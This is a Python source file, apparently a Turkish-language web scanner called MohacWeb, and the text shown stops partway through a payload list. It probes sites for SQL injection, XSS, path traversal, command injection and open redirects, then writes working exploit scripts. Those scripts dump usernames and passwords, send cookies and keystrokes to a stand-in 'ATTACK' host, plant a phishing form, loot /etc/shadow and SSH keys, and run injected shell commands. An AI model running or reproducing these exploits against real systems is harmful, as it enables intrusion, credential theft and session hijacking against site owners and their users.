#!/usr/bin/env python3
"""
MohacWeb v1.0 Enhanced - Web Security Scanner
Step-by-Step Vulnerability Explanation + Exploit Code Generation
For Authorized Penetration Testing Only
"""

import sys, os, time, json, sqlite3, hashlib, random, string, re, socket, ssl
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote, unquote

VERSION = "1.0 Enhanced"


# ============================================
# RENK SINIFI
# ============================================
class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    Cy = "\033[96m"
    W = "\033[97m"
    Bld = "\033[1m"
    Dim = "\033[2m"
    RST = "\033[0m"

def banner():
    print(f"""
{chr(27)}[96m{chr(27)}[1m
  __  __       _        _   _      __        __    _       _ _
 |  \/  | ___ | |__    | | | |     \ \      / /_ _| |_ ___| | |
 | |\/| |/ _ \| '_ \   | |_| |_____\ \ /\ / / _` | __/ _ \ | |
 | |  | | (_) | |_) |  |  _  |_____|\ V  V / (_| | ||  __/ | |
 |_|  |_|\___/|_.__/   |_| |_|      \_/\_/ \__,_|\__\___|_|_|

 {chr(27)}[91mv1.0 Enhanced{chr(27)}[0m | {chr(27)}[93mStep-by-Step Exploit Generator{chr(27)}[0m
 {chr(27)}[2mFor Authorized Penetration Testing Only{chr(27)}[0m
""")
    print(f"  {chr(27)}[2m[*] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{chr(27)}[0m")
    print()

def safe_request(url, method="GET", data=None, headers=None, timeout=10):
    import urllib.request, urllib.error, urllib.parse
    if headers is None:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Connection": "close"
        }
    try:
        if method == "POST" and data:
            if isinstance(data, dict):
                data = urllib.parse.urlencode(data).encode("utf-8")
            req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        else:
            req = urllib.request.Request(url, headers=headers)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="ignore")
        return {"status": resp.getcode(), "body": body, "headers": dict(resp.headers), "error": None}
    except urllib.error.HTTPError as e:
        try: body = e.read().decode("utf-8", errors="ignore")
        except: body = ""
        return {"status": e.code, "body": body, "headers": {}, "error": str(e)}
    except Exception as e:
        return {"status": 0, "body": "", "headers": {}, "error": str(e)}

def extract_forms(html):
    forms = []
    form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
    input_pattern = re.compile(r'<input[^>]*>', re.IGNORECASE)
    action_pattern = re.compile(r'action=["\']([^"\']*)["\']', re.IGNORECASE)
    method_pattern = re.compile(r'method=["\']([^"\']*)["\']', re.IGNORECASE)
    for form_match in form_pattern.finditer(html):
        form_html = form_match.group(0)
        action = action_pattern.search(form_html)
        method = method_pattern.search(form_html)
        inputs = []
        for inp in input_pattern.finditer(form_html):
            inp_html = inp.group(0)
            name = re.search(r'name=["\']([^"\']*)["\']', inp_html, re.IGNORECASE)
            inp_type = re.search(r'type=["\']([^"\']*)["\']', inp_html, re.IGNORECASE)
            value = re.search(r'value=["\']([^"\']*)["\']', inp_html, re.IGNORECASE)
            if name:
                inputs.append({
                    "name": name.group(1),
                    "type": inp_type.group(1) if inp_type else "text",
                    "value": value.group(1) if value else ""
                })
        forms.append({
            "action": action.group(1) if action else "",
            "method": method.group(1).upper() if method else "GET",
            "inputs": inputs
        })
    return forms

def extract_links(html, base_url):
    links = set()
    pattern = re.compile(r'href=["\']([^"#\']*)["\']', re.IGNORECASE)
    for match in pattern.finditer(html):
        link = match.group(1)
        full_link = urljoin(base_url, link)
        if full_link.startswith("http"):
            links.add(full_link)
    return list(links)

# ============================================
# VERITABANI
# ============================================
class Database:
    def __init__(self, db_path="mohacweb.db"):
        self.db_path = db_path
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("""CREATE TABLE IF NOT EXISTS scans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT, scan_type TEXT, vulns_found INTEGER,
            critical INTEGER, high INTEGER, medium INTEGER,
            low INTEGER, info INTEGER, scan_time REAL,
            timestamp TEXT, results TEXT
        )""")
        c.execute("""CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            scan_id INTEGER, vuln_type TEXT, severity TEXT,
            url TEXT, parameter TEXT, payload TEXT,
            description TEXT, step_by_step TEXT,
            exploit_code TEXT, cvss_score REAL,
            cwe_id TEXT, owasp_category TEXT, timestamp TEXT,
            FOREIGN KEY (scan_id) REFERENCES scans(id)
        )""")
        conn.commit()
        conn.close()

    def save_scan(self, target, scan_type, results, scan_time):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        vulns = results.get("vulnerabilities", [])
        critical = sum(1 for v in vulns if v.get("severity") == "Critical")
        high = sum(1 for v in vulns if v.get("severity") == "High")
        medium = sum(1 for v in vulns if v.get("severity") == "Medium")
        low = sum(1 for v in vulns if v.get("severity") == "Low")
        info = sum(1 for v in vulns if v.get("severity") == "Info")
        c.execute("""INSERT INTO scans (target, scan_type, vulns_found, critical, high, medium, low, info, scan_time, timestamp, results)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (target, scan_type, len(vulns), critical, high, medium, low, info, scan_time,
             datetime.now().isoformat(), json.dumps(results)))
        scan_id = c.lastrowid
        for v in vulns:
            c.execute("""INSERT INTO vulnerabilities (scan_id, vuln_type, severity, url, parameter, payload, description, step_by_step, exploit_code, cvss_score, cwe_id, owasp_category, timestamp)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (scan_id, v.get("type",""), v.get("severity",""), v.get("url",""),
                 v.get("parameter",""), v.get("payload",""), v.get("description",""),
                 json.dumps(v.get("step_by_step",[])), v.get("exploit_code",""),
                 v.get("cvss_score",0.0), v.get("cwe_id",""), v.get("owasp_category",""),
                 datetime.now().isoformat()))
        conn.commit()
        conn.close()
        return scan_id

    def get_history(self, limit=20):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT id, target, scan_type, vulns_found, critical, high, medium, low, scan_time, timestamp FROM scans ORDER BY id DESC LIMIT ?", (limit,))
        rows = c.fetchall()
        conn.close()
        return rows

    def get_scan_details(self, scan_id):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT * FROM scans WHERE id = ?", (scan_id,))
        scan = c.fetchone()
        c.execute("SELECT * FROM vulnerabilities WHERE scan_id = ?", (scan_id,))
        vulns = c.fetchall()
        conn.close()
        return scan, vulns

# ============================================
# AI HACKER BRAIN - ACIK ANALIZ MOTORU
# ============================================
class HackerBrain:
    """Bulunan aciklari aciklayan ve exploit yazan AI motoru"""

    @staticmethod
    def explain_sqli(url, parameter, payload, response_body):
        steps = [
            "[ADIM 1] Hedef URL analiz edildi: " + url,
            "[ADIM 2] Test edilen parametre: '" + parameter + "'",
            "[ADIM 3] Gonderilen payload: " + payload,
            "[ADIM 4] Sunucu yanitinda SQL hata mesaji tespit edildi",
            "[ADIM 5] Hata mesaji veritabani motor bilgisi sizdiriyor",
            "[ADIM 6] Parametre dogrudan SQL sorgusuna ekleniyor (sanitizasyon yok)",
            "[ADIM 7] saldirgan istedigi SQL sorgusunu calistirabilir",
            "[ADIM 8] VERI SIZINTISI RISKI: Kullanici bilgileri, sifreler cozulebilir"
        ]

        exploit_lines = [
            '#!/usr/bin/env python3',
            '"""',
            'MohacWeb - SQL Injection Exploit',
            'Hedef: ' + url,
            'Parametre: ' + parameter,
            'UYARI: Yalnizca yetkili testlerde kullanin!',
            '"""',
            '',
            'import urllib.request, urllib.parse, ssl, re',
            '',
            'TARGET = "' + url + '"',
            'PARAM = "' + parameter + '"',
            '',
            'ssl_ctx = ssl.create_default_context()',
            'ssl_ctx.check_hostname = False',
            'ssl_ctx.verify_mode = ssl.CERT_NONE',
            '',
            'def send_payload(p):',
            '    parsed = urllib.parse.urlparse(TARGET)',
            '    params = urllib.parse.parse_qs(parsed.query)',
            '    params[PARAM] = p',
            '    q = urllib.parse.urlencode(params, doseq=True)',
            '    u = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + q',
            '    req = urllib.request.Request(u, headers={"User-Agent":"Mozilla/5.0"})',
            '    resp = urllib.request.urlopen(req, timeout=10, context=ssl_ctx)',
            '    return resp.read().decode("utf-8", errors="ignore")',
            '',
            'def detect_columns():',
            '    print("[*] Kolon sayisi tespit ediliyor...")',
            '    for i in range(1, 30):',
            '        r = send_payload("1\' ORDER BY " + str(i) + "-- -")',
            '        if "error" in r.lower() or "unknown" in r.lower():',
            '            print("[+] Kolon sayisi: " + str(i-1))',
            '            return i - 1',
            '    return 0',
            '',
            'def extract_databases():',
            '    print("[*] Veritabanlari cikariliyor...")',
            '    p = "1\' UNION SELECT 1,GROUP_CONCAT(schema_name),3,4 FROM information_schema.schemata-- -"',
            '    return send_payload(p)',
            '',
            'def extract_tables(db):',
            '    print("[*] Tablolar cikariliyor: " + db)',
            '    p = "1\' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=\'" + db + "\'-- -"',
            '    return send_payload(p)',
            '',
            'def dump_users():',
            '    print("[*] Kullanici bilgileri cekiliyor...")',
            '    p = "1\' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4 FROM users-- -"',
            '    return send_payload(p)',
            '',
            'if __name__ == "__main__":',
            '    print("=" * 60)',
            '    print("  MohacWeb SQL Injection Exploit")',
            '    print("=" * 60)',
            '    cols = detect_columns()',
            '    if cols == 0:',
            '        print("[-] Kolon sayisi tespit edilemedi")',
            '        exit(1)',
            '    dbs = extract_databases()',
            '    print("[+] Veritabanlari:")',
            '    print(dbs[:500])',
            '    # tables = extract_tables("target_db")',
            '    # users = dump_users()',
            '    print("[*] Exploit tamamlandi!")',
        ]

        return {
            "type": "SQL Injection",
            "severity": "Critical",
            "cvss_score": 9.8,
            "cwe_id": "CWE-89",
            "owasp_category": "A03:2021 - Injection",
            "description": "SQL Injection acigi tespit edildi. '" + parameter + "' parametresi kullanici girisini dogrudan SQL sorgusuna ekliyor.",
            "step_by_step": steps,
            "exploit_code": "\n".join(exploit_lines)
        }

    @staticmethod
    def explain_xss(url, parameter, payload, response_body):
        steps = [
            "[ADIM 1] Hedef URL analiz edildi: " + url,
            "[ADIM 2] Test edilen parametre: '" + parameter + "'",
            "[ADIM 3] Gonderilen XSS payload: " + payload,
            "[ADIM 4] Payload sunucu yanitinda filtrelenmemis olarak dondu",
            "[ADIM 5] HTML/JS karakterleri filtrelenmiyor",
            "[ADIM 6] Kullanici tarayicida bu icerigi gordugunde JavaScript calisacak",
            "[ADIM 7] saldirgan: calma, keylogging, phishing yapabilir",
            "[ADIM 8] OTELIM: Oturum cozulebilir, hesap devralinabilir"
        ]

        exploit_lines = [
            '#!/usr/bin/env python3',
            '"""MohacWeb - XSS Exploit | Hedef: ' + url + ' | Parametre: ' + parameter + '"""',
            'import urllib.request, urllib.parse, ssl',
            '',
            'TARGET = "' + url + '"',
            'PARAM = "' + parameter + '"',
            '',
            'PAYLOADS = {',
            '    "cookie_steal": "<script>new Image().src=\\"http://ATTACK/steal?c=\\"+document.cookie</script>",',
            '    "keylogger": "<script>document.addEventListener(\'keypress\',function(e){new Image().src=\\"http://ATTACK/log?k=\\"+e.key})</script>",',
            '    "phishing": "<script>document.body.innerHTML=\'<h1>Oturum Sonlandi</h1><form action=http://ATTACK><input name=u><input name=p type=password><button>Giris</button></form>\'</script>",',
            '}',
            '',
            'def test_xss(payload):',
            '    encoded = urllib.parse.quote(payload)',
            '    url = TARGET + "?" + PARAM + "=" + encoded',
            '    ctx = ssl.create_default_context()',
            '    ctx.check_hostname = False',
            '    ctx.verify_mode = ssl.CERT_NONE',
            '    req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})',
            '    resp = urllib.request.urlopen(req, timeout=10, context=ctx)',
            '    body = resp.read().decode("utf-8", errors="ignore")',
            '    return payload in body',
            '',
            'if __name__ == "__main__":',
            '    print("=" * 60)',
            '    print("  MohacWeb XSS Exploit")',
            '    print("=" * 60)',
            '    for name, payload in PAYLOADS.items():',
            '        print("[*] Test: " + name)',
            '        if test_xss(payload):',
            '            print("[+] BASARILI: " + name)',
            '        else:',
            '            print("[-] Basarisiz: " + name)',
        ]

        return {
            "type": "Cross-Site Scripting (XSS)",
            "severity": "High",
            "cvss_score": 7.5,
            "cwe_id": "CWE-79",
            "owasp_category": "A03:2021 - Injection",
            "description": "Reflected XSS acigi tespit edildi. '" + parameter + "' parametresi HTML olarak render ediliyor.",
            "step_by_step": steps,
            "exploit_code": "\n".join(exploit_lines)
        }

    @staticmethod
    def explain_path_traversal(url, parameter, payload, response_body):
        steps = [
            "[ADIM 1] Hedef URL analiz edildi: " + url,
            "[ADIM 2] Test edilen parametre: '" + parameter + "'",
            "[ADIM 3] Gonderilen traversal payload: " + payload,
            "[ADIM 4] Sunucu dosya sistemi dizin atlama denemesine yanit verdi",
            "[ADIM 5] Dosya yolu dogrulanmiyor (sanitizasyon yok)",
            "[ADIM 6] saldirgan sunucudaki herhangi bir dosyayi okuyabilir",
            "[ADIM 7] KRITIK: /etc/passwd, config dosyalari, veritabani bilgileri okunabilir",
            "[ADIM 8] RCE Riski: Log dosyalarina kod enjekte edilerek uzaktan kod calistirma"
        ]

        exploit_lines = [
            '#!/usr/bin/env python3',
            '"""MohacWeb - Path Traversal Exploit | Hedef: ' + url + '"""',
            'import urllib.request, urllib.parse, ssl',
            '',
            'TARGET = "' + url + '"',
            'PARAM = "' + parameter + '"',
            '',
            'LINUX_TARGETS = [',
            '    "/etc/passwd", "/etc/shadow", "/etc/hostname",',
            '    "/var/log/apache2/access.log", "/var/www/html/.env",',
            '    "/var/www/html/config.php", "/var/www/html/wp-config.php",',
            '    "/root/.bash_history", "/root/.ssh/id_rsa", "/etc/crontab",',
            ']',
            '',
            'BYPASS_TECHNIQUES = [',
            '    ("../" * 8, "Standart"),',
            '    ("..%2f" * 8, "URL encoded"),',
            '    ("..%252f" * 8, "Double encoded"),',
            '    ("..%c0%af" * 8, "UTF-8 overlong"),',
            '    ("..%00/" * 8, "Null byte"),',
            ']',
            '',
            'def test_file(fpath, technique="../"):',
            '    payload = technique + fpath.lstrip("/")',
            '    parsed = urllib.parse.urlparse(TARGET)',
            '    params = urllib.parse.parse_qs(parsed.query)',
            '    params[PARAM] = payload',
            '    q = urllib.parse.urlencode(params, doseq=True)',
            '    u = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + q',
            '    ctx = ssl.create_default_context()',
            '    ctx.check_hostname = False',
            '    ctx.verify_mode = ssl.CERT_NONE',
            '    req = urllib.request.Request(u, headers={"User-Agent":"Mozilla/5.0"})',
            '    resp = urllib.request.urlopen(req, timeout=10, context=ctx)',
            '    body = resp.read().decode("utf-8", errors="ignore")',
            '    indicators = ["root:", "[boot loader]", "DB_PASSWORD", "DB_HOST"]',
            '    for ind in indicators:',
            '        if ind in body:',
            '            return True, body[:2000]',
            '    return False, ""',
            '',
            'if __name__ == "__main__":',
            '    print("=" * 60)',
            '    print("  Path Traversal Exploit")',
            '    print("=" * 60)',
            '    found = []',
            '    for tech, name in BYPASS_TECHNIQUES:',
            '        print("[*] Teknik: " + name)',
            '        for target_file in LINUX_TARGETS:',
            '            ok, content = test_file(target_file, tech)',
            '            if ok:',
            '                print("[+] BASARILI: " + target_file)',
            '                print(content[:200])',
            '                found.append(target_file)',
            '                with open("looted_" + target_file.replace("/","_"), "w") as f:',
            '                    f.write(content)',
            '                break',
            '    if not found:',
            '        print("[-] Dosya okuma basarisiz")',
            '    print("[*] Tarama tamamlandi!")',
        ]

        return {
            "type": "Path / Directory Traversal",
            "severity": "Critical",
            "cvss_score": 9.1,
            "cwe_id": "CWE-22",
            "owasp_category": "A01:2021 - Broken Access Control",
            "description": "Path Traversal acigi tespit edildi. '" + parameter + "' parametresi dizin atlamaya izin veriyor.",
            "step_by_step": steps,
            "exploit_code": "\n".join(exploit_lines)
        }

    @staticmethod
    def explain_cmd_injection(url, parameter, payload, response_body):
        steps = [
            "[ADIM 1] Hedef URL analiz edildi: " + url,
            "[ADIM 2] Test edilen parametre: '" + parameter + "'",
            "[ADIM 3] Gonderilen command injection payload: " + payload,
            "[ADIM 4] Sunucu sistem komutunun sonucunu dondurdu",
            "[ADIM 5] Parametre dogrudan sistem komutuna geciriliyor",
            "[ADIM 6] saldirgan sunucuda istedigi komutu calistirabilir",
            "[ADIM 7] KRITIK: Tam sunucu kontrolu saglanabilir",
            "[ADIM 8] VERI SIZINTISI + RCE: Tum dosyalar okunabilir, ters shell alinabilir"
        ]

        exploit_lines = [
            '#!/usr/bin/env python3',
            '"""MohacWeb - Command Injection Exploit | Hedef: ' + url + '"""',
            'import urllib.request, urllib.parse, ssl',
            '',
            'TARGET = "' + url + '"',
            'PARAM = "' + parameter + '"',
            '',
            'SEPARATORS = [',
            '    (";", "Semicolon"), ("|", "Pipe"), ("||", "OR"),',
            '    ("&&", "AND"), ("`", "Backtick"), ("$()", "CmdSub"),',
            ']',
            '',
            'def inject(cmd, sep=";"):',
            '    payload = "test" + sep + cmd',
            '    parsed = urllib.parse.urlparse(TARGET)',
            '    params = urllib.parse.parse_qs(parsed.query)',
            '    params[PARAM] = payload',
            '    q = urllib.parse.urlencode(params, doseq=True)',
            '    u = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + q',
            '    ctx = ssl.create_default_context()',
            '    ctx.check_hostname = False',
            '    ctx.verify_mode = ssl.CERT_NONE',
            '    req = urllib.request.Request(u, headers={"User-Agent":"Mozilla/5.0"})',
            '    resp = urllib.request.urlopen(req, timeout=15, context=ctx)',
            '    return resp.read().decode("utf-8", errors="ignore")',
            '',
            'def find_separator():',
            '    for sep, name in SEPARATORS:',
            '        r = inject("id", sep)',
            '        if "uid=" in r:',
            '            print("[+] Separator: " + name)',
            '            return sep',
            '    return None',
            '',
            'def gather_info(sep):',
            '    cmds = [("whoami","Kullanici"), ("id","ID"), ("uname -a","OS"),',
            '            ("cat /etc/hostname","Hostname"), ("cat /etc/passwd","Users")]',
            '    for cmd, desc in cmds:',
            '        r = inject(cmd, sep)',
            '        if r and len(r) > 10:',
            '            print("[+] " + desc + ": " + r[:200])',
            '',
            'if __name__ == "__main__":',
            '    print("=" * 60)',
            '    print("  Command Injection Exploit")',
            '    print("=" * 60)',
            '    sep = find_separator()',
            '    if sep:',
            '        gather_info(sep)',
            '    else:',
            '        print("[-] Calisan separator bulunamadi")',
        ]

        return {
            "type": "OS Command Injection",
            "severity": "Critical",
            "cvss_score": 10.0,
            "cwe_id": "CWE-78",
            "owasp_category": "A03:2021 - Injection",
            "description": "OS Command Injection acigi. '" + parameter + "' dogrudan sistem komutuna geciriliyor.",
            "step_by_step": steps,
            "exploit_code": "\n".join(exploit_lines)
        }

    @staticmethod
    def explain_open_redirect(url, parameter, payload, response_body):
        steps = [
            "[ADIM 1] Hedef URL: " + url,
            "[ADIM 2] Test parametresi: '" + parameter + "'",
            "[ADIM 3] Redirect payload: " + payload,
            "[ADIM 4] Sunucu kullanciyi harici siteye yonlendirdi",
            "[ADIM 5] URL dogrulanmiyor (guvenli domain kontrolu yok)",
            "[ADIM 6] saldirgan phishing linki olusturabilir",
            "[ADIM 7] OAuth token calma saldirilarinda kullanilabilir",
            "[ADIM 8] Guvenilir domain uzerinden oltalama yapilabilir"
        ]

        exploit_lines = [
            '#!/usr/bin/env python3',
            '"""MohacWeb - Open Redirect Exploit | Hedef: ' + url + '"""',
            'import urllib.request, urllib.parse, ssl',
            '',
            'TARGET = "' + url + '"',
            'PARAM = "' + parameter + '"',
            '',
            'BYPASS_PAYLOADS = [',
            '    "https://evil.com", "//evil.com",',
            '    "https://evil.com@target.com",',
            '    "https://target.com@evil.com",',
            '    "https://target.com.evil.com",',
            '    "https://evil.com#.target.com",',
            ']',
            '',
            'def test_redirect(payload):',
            '    parsed = urllib.parse.urlparse(TARGET)',
            '    params = urllib.parse.parse_qs(parsed.query)',
            '    params[PARAM] = payload',
            '    q = urllib.parse.urlencode(params, doseq=True)',
            '    u = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + q',
            '    ctx = ssl.create_default_context()',
            '    ctx.check_hostname = False',
            '    ctx.verify_mode = ssl.CERT_NONE',
            '    req = urllib.request.Request(u, headers={"User-Agent":"Mozilla/5.0"})',
            '    resp = urllib.request.urlopen(req, timeout=10, context=ctx)',
            '    loc = resp.headers.get("Location", "")',
            '    return "evil.com" in loc',
            '',
            'if __name__ == "__main__":',
            '    print("=" * 60)',
            '    print("  Open Redirect Exploit")',
            '    print("=" * 60)',
            '    for p in BYPASS_PAYLOADS:',
            '        print("[*] Test: " + p)',
            '        if test_redirect(p):',
            '            print("[+] BASARILI: " + p)',
        ]

        return {
            "type": "Open Redirect",
            "severity": "Medium",
            "cvss_score": 6.1,
            "cwe_id": "CWE-601",
            "owasp_category": "A01:2021 - Broken Access Control",
            "description": "Open Redirect acigi. '" + parameter + "' harici siteye yonlendirme yapabilir.",
            "step_by_step": steps,
            "exploit_code": "\n".join(exploit_lines)
        }

    @staticmethod
    def explain_info_disclosure(url, finding_type, details, response_body):
        severity_map = {
            "server_version": ("Medium", 5.3),
            "directory_listing": ("Medium", 5.3),
            "sensitive_file": ("High", 7.5),
            "error_message": ("Low", 3.7),
            "comments": ("Info", 0.0),
        }
        severity, cvss = severity_map.get(finding_type, ("Info", 0.0))
        steps = [
            "[ADIM 1] Hedef URL tarandi: " + url,
            "[ADIM 2] Tespit: " + finding_type,
            "[ADIM 3] Detay: " + details,
            "[ADIM 4] Bu bilgi saldirgan icin kesif asamasinda degerli",
            "[ADIM 5] Surum bilgisiyle CVE aramasi yapilabilir",
            "[ADIM 6] Hassas dosyalar配置 bilgileri icerebilir",
            "[ADIM 7] Oneri: Bilgileri gizleyin veya erisimi kisitlayin"
        ]
        return {
            "type": "Information Disclosure: " + finding_type,
            "severity": severity,
            "cvss_score": cvss,
            "cwe_id": "CWE-200",
            "owasp_category": "A05:2021 - Security Misconfiguration",
            "description": "Bilgi ifsasi: " + details,
            "step_by_step": steps,
            "exploit_code": "# Bilgi ifsasi icin exploit kodu gerekli degil\n# Bilgi: " + details
        }


# ============================================
# TARAMA MODULLERI
# ============================================
class Scanner:
    def __init__(self, target_url, db=None):
        self.target = target_url.rstrip("/")
        self.parsed = urlparse(self.target)
        self.domain = self.parsed.netloc
        self.vulns = []
        self.db = db or Database()
        self.brain = HackerBrain()

    def log(self, msg, level="info"):
        icons = {"info": "[*]", "success": "[+]", "error": "[-]", "warn": "[!]"}
        colors = {"info": C.B, "success": C.G, "error": C.R, "warn": C.Y}
        icon = icons.get(level, "[*]")
        color = colors.get(level, C.W)
        print("  " + color + icon + C.RST + " " + msg)

    def add_vuln(self, vuln_data):
        vuln_data["url"] = vuln_data.get("url", self.target)
        self.vulns.append(vuln_data)

    def reconnaissance(self):
        self.log("Kesif baslatiliyor...", "info")
        results = {}
        resp = safe_request(self.target)
        if resp["error"]:
            self.log("Baglanti hatasi: " + str(resp["error"])[:50], "error")
            return results

        headers = resp["headers"]
        results["headers"] = headers

        server = headers.get("Server", headers.get("server", ""))
        if server:
            self.log("Sunucu: " + server, "success")
            self.add_vuln(self.brain.explain_info_disclosure(self.target, "server_version", "Server: " + server, ""))

        powered = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
        if powered:
            self.log("X-Powered-By: " + powered, "warn")
            self.add_vuln(self.brain.explain_info_disclosure(self.target, "server_version", "X-Powered-By: " + powered, ""))

        sec_headers = ["X-Frame-Options", "X-Content-Type-Options", "Content-Security-Policy", "Strict-Transport-Security"]
        missing = [h for h in sec_headers if h.lower() not in [k.lower() for k in headers.keys()]]
        if missing:
            self.log("Eksik guvenlik basliklari: " + ", ".join(missing), "warn")

        forms = extract_forms(resp["body"])
        results["forms"] = forms
        self.log(str(len(forms)) + " form bulundu", "success")

        links = extract_links(resp["body"], self.target)
        results["links"] = links
        self.log(str(len(links)) + " link bulundu", "success")

        return results

    def scan_sqli(self, url=None, forms=None):
        url = url or self.target
        self.log("SQL Injection taramasi baslatiliyor...", "info")

        sqli_payloads = [
            ("'", "Tek tirnak"),
            ("' OR '1'='1", "OR bypass"),
            ("' OR '1'='1' --", "OR + comment"),
            ("' UNION SELECT NULL--", "UNION test"),
            ("1; WAITFOR DELAY '0:0:5'--", "Time-based MSSQL"),
            ("' AND SLEEP(5)--", "Time-based MySQL"),
        ]

        sqli_errors = [
            "sql syntax", "mysql_fetch", "sqlite3", "ORA-", "PostgreSQL",
            "Unclosed quotation mark", "ODBC SQL Server", "Warning: mysql",
            "valid MySQL result", "SQLSTATE", "Syntax error",
            "mysql_num_rows", "Microsoft SQL", "oracle.jdbc"
        ]

        parsed = urlparse(url)
        params = {}
        if parsed.query:
            for p in parsed.query.split("&"):
                if "=" in p:
                    k, v = p.split("=", 1)
                    params[k] = v
        if not params:
            params = {"id": "1", "page": "1", "search": "test"}

        for param_name in params:
            for payload, desc in sqli_payloads:
                test_params = dict(params)
                test_params[param_name] = payload
                query = "&".join(k + "=" + quote(v) for k, v in test_params.items())
                test_url = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + query

                if "SLEEP" in payload or "WAITFOR" in payload:
                    start = time.time()
                    safe_request(test_url)
                    elapsed = time.time() - start
                    if elapsed >= 4.5:
                        self.log("SQLi (Time-based) bulundu: " + param_name, "success")
                        vuln = self.brain.explain_sqli(test_url, param_name, payload, "")
                        vuln["parameter"] = param_name
                        vuln["payload"] = payload
                        self.add_vuln(vuln)
                        return True
                else:
                    resp = safe_request(test_url)
                    if resp["error"] and resp["status"] == 0:
                        continue
                    body_lower = resp["body"].lower()
                    for error in sqli_errors:
                        if error.lower() in body_lower:
                            self.log("SQLi (Error-based) bulundu: " + param_name, "success")
                            vuln = self.brain.explain_sqli(test_url, param_name, payload, resp["body"])
                            vuln["parameter"] = param_name
                            vuln["payload"] = payload
                            self.add_vuln(vuln)
                            return True

        if forms:
            for form in forms:
                for inp in form.get("inputs", []):
                    if inp["type"] in ("text", "search", "email", "hidden"):
                        for payload, desc in sqli_payloads[:4]:
                            action = urljoin(url, form["action"]) if form["action"] else url
                            data = {}
                            for i in form["inputs"]:
                                data[i["name"]] = payload if i["name"] == inp["name"] else i.get("value", "test")
                            if form["method"] == "POST":
                                resp = safe_request(action, method="POST", data=data)
                            else:
                                query = "&".join(k + "=" + quote(str(v)) for k, v in data.items())
                                resp = safe_request(action + "?" + query)
                            if resp["error"]:
                                continue
                            for error in sqli_errors:
                                if error.lower() in resp["body"].lower():
                                    self.log("SQLi (Form) bulundu: " + inp["name"], "success")
                                    vuln = self.brain.explain_sqli(action, inp["name"], payload, resp["body"])
                                    vuln["parameter"] = inp["name"]
                                    vuln["payload"] = payload
                                    self.add_vuln(vuln)
                                    return True

        self.log("SQL Injection bulunamadi", "info")
        return False

    def scan_xss(self, url=None, forms=None):
        url = url or self.target
        self.log("XSS taramasi baslatiliyor...", "info")
        xss_marker = "mohac" + "".join(random.choices(string.ascii_lowercase, k=6))
        xss_payloads = [
            "<script>" + xss_marker + "</script>",
            '"><img src=x onerror=' + xss_marker + ">",
            "'><svg onload=" + xss_marker + ">",
        ]
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            for p in parsed.query.split("&"):
                if "=" in p:
                    k, v = p.split("=", 1)
                    params[k] = v
        if not params:
            params = {"q": "test", "search": "test"}

        for param_name in params:
            for payload in xss_payloads:
                test_params = dict(params)
                test_params[param_name] = payload
                query = "&".join(k + "=" + quote(str(v)) for k, v in test_params.items())
                test_url = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + query
                resp = safe_request(test_url)
                if resp["error"]:
                    continue
                if payload in resp["body"] or xss_marker in resp["body"]:
                    self.log("XSS bulundu: " + param_name, "success")
                    vuln = self.brain.explain_xss(test_url, param_name, payload, resp["body"])
                    vuln["parameter"] = param_name
                    vuln["payload"] = payload
                    self.add_vuln(vuln)
                    return True

        if forms:
            for form in forms:
                for inp in form.get("inputs", []):
                    if inp["type"] in ("text", "search", "email"):
                        for payload in xss_payloads[:2]:
                            action = urljoin(url, form["action"]) if form["action"] else url
                            data = {}
                            for i in form["inputs"]:
                                data[i["name"]] = payload if i["name"] == inp["name"] else i.get("value", "test")
                            if form["method"] == "POST":
                                resp = safe_request(action, method="POST", data=data)
                            else:
                                query = "&".join(k + "=" + quote(str(v)) for k, v in data.items())
                                resp = safe_request(action + "?" + query)
                            if resp["error"]:
                                continue
                            if payload in resp["body"] or xss_marker in resp["body"]:
                                self.log("XSS (Form) bulundu: " + inp["name"], "success")
                                vuln = self.brain.explain_xss(action, inp["name"], payload, resp["body"])
                                vuln["parameter"] = inp["name"]
                                vuln["payload"] = payload
                                self.add_vuln(vuln)
                                return True

        self.log("XSS bulunamadi", "info")
        return False

    def scan_path_traversal(self, url=None):
        url = url or self.target
        self.log("Path Traversal taramasi baslatiliyor...", "info")
        traversal_payloads = [
            ("../../../etc/passwd", "root:", "Standart Linux"),
            ("..\\..\\..\\windows\\win.ini", "[boot loader]", "Standart Windows"),
            ("....//....//....//etc/passwd", "root:", "Double dot bypass"),
            ("..%2f..%2f..%2fetc%2fpasswd", "root:", "URL encoded"),
            ("..%252f..%252f..%252fetc%2fpasswd", "root:", "Double encoded"),
            ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "root:", "UTF-8 overlong"),
